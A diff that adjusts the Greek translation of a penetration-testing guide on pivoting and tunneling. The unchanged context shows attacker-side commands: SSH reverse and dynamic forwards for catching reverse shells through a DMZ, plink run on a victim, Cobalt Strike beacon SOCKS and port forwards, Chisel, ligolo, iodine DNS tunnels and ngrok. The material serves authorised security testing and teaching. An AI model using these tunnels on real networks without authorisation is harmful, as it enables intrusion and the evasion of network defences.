@@ -55,9 +55,9 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Αντίστροφη Προώθηση Θυρών
+### Reverse Port Forwarding
 
-Αυτό είναι χρήσιμο για να αποκτήσετε αντίστροφες θήκες από εσωτερικούς υπολογιστές μέσω μιας DMZ στον υπολογιστή σας:
+Αυτό είναι χρήσιμο για να αποκτήσετε αντίστροφες θύρες από εσωτερικούς υπολογιστές μέσω μιας DMZ στον υπολογιστή σας:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Μπορείτε να **tunnel** μέσω **ssh** όλη την **κίνηση** σε ένα **subnetwork** μέσω ενός host.\
+Μπορείτε να **tunnel** μέσω **ssh** όλη την **κίνηση** σε ένα **υποδίκτυο** μέσω ενός host.\
 Για παράδειγμα, προωθώντας όλη την κίνηση που πηγαίνει προς 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -117,7 +117,7 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-Άλλος τρόπος:
+Ένας άλλος τρόπος:
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Ανοίξτε μια θύρα στον teamserver που ακούει σε όλα τα interfaces που μπορούν να χρησιμοποιηθούν για **να δρομολογήσουν την κίνηση μέσω του beacon**.
+Ανοίξτε μια θύρα στον teamserver που ακούει σε όλα τα interfaces που μπορούν να χρησιμοποιηθούν για να **δρομολογήσουν την κίνηση μέσω του beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -152,14 +152,14 @@ rportfwd stop [bind port]
 ```
 Για σημείωση:
 
-- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση με τον Team Server, όχι για τη διαμεσολάβηση μεταξύ μεμονωμένων μηχανών**.
+- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση στον Server Ομάδας, όχι για τη διαμεσολάβηση μεταξύ μεμονωμένων μηχανών**.
 - Η κίνηση είναι **συνδεδεμένη μέσα στην κίνηση C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
 - **Δικαιώματα διαχειριστή δεν απαιτούνται** για τη δημιουργία αντίστροφων προωθήσεων θύρας σε υψηλές θύρες.
 
 ### rPort2Port τοπικά
 
 > [!WARNING]
-> Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον υπολογιστή beacon**, όχι στον Team Server και η **κίνηση αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Team Server) και από εκεί στον καθορισμένο host:port
+> Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον οικοδεσπότη beacon**, όχι στον Server Ομάδας και η **κίνηση αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Server Ομάδας) και από εκεί στον καθορισμένο οικοδεσπότη:θύρα
 ```
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -175,7 +175,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Μπορείτε να το κατεβάσετε από τη σελίδα εκδόσεων του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Πρέπει να χρησιμοποιήσετε την **ίδια έκδοση για πελάτη και διακομιστή**
+Πρέπει να χρησιμοποιήσετε την **ίδια έκδοση για τον πελάτη και τον διακομιστή**
 
 ### socks
 ```bash
@@ -219,7 +219,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Σύνδεση και Ακρόαση
+### Σύνδεση και Ακρόαση Πράκτορα
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -320,9 +320,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Είναι σαν μια κονσόλα PuTTY έκδοση (οι επιλογές είναι πολύ παρόμοιες με έναν ssh client).
+Είναι σαν μια κονσόλα PuTTY έκδοση (οι επιλογές είναι πολύ παρόμοιες με έναν ssh πελάτη).
 
-Καθώς αυτό το δυαδικό αρχείο θα εκτελείται στο θύμα και είναι ένας ssh client, πρέπει να ανοίξουμε την υπηρεσία ssh και την θύρα μας ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στη μηχανή μας:
+Καθώς αυτό το δυαδικό αρχείο θα εκτελείται στο θύμα και είναι ένας ssh πελάτης, πρέπει να ανοίξουμε την υπηρεσία ssh και την θύρα μας ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στη μηχανή μας:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -349,7 +349,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από τη δυνατότητα Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **tunneling πακέτων μέσω της σύνδεσης RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-Στον υπολογιστή-πελάτη σας φορτώστε **`SocksOverRDP-Plugin.dll`** έτσι:
+Στον υπολογιστή-πελάτη σας, φορτώστε **`SocksOverRDP-Plugin.dll`** όπως αυτό:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
@@ -384,7 +384,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 Αυθεντικοποιεί έναν proxy και δεσμεύει μια θύρα τοπικά που προωθείται στην εξωτερική υπηρεσία που καθορίζετε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το εργαλείο της επιλογής σας μέσω αυτής της θύρας.\
-Για παράδειγμα, προωθήστε τη θύρα 443.
+Για παράδειγμα, προωθήστε τη θύρα 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -392,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Τώρα, αν ρυθμίσετε για παράδειγμα στην θυματική μηχανή την υπηρεσία **SSH** να ακούει στην θύρα 443. Μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας 2222 του επιτιθέμενου.\
+Τώρα, αν ρυθμίσετε για παράδειγμα στην θυματική μηχανή την υπηρεσία **SSH** να ακούει στην θύρα 443. Μπορείτε να συνδεθείτε σε αυτή μέσω της θύρας 2222 του επιτιθέμενου.\
 Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην θύρα 2222.
 
 ## YARP
@@ -405,7 +405,7 @@ Tunnel 2222:<attackers_machine>:443
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν tun adapters και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας DNS queries.
+Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας ερωτήματα DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **είναι ένα εργαλείο για να εκθέτει λύσεις στο Διαδίκτυο με μία γραμμή εντολής.**\
-_&#x45;xposition URI είναι όπως:_ **UID.ngrok.io**
+_Οι URI εκθέσεως είναι όπως:_ **UID.ngrok.io**
 
 ### Εγκατάσταση
 
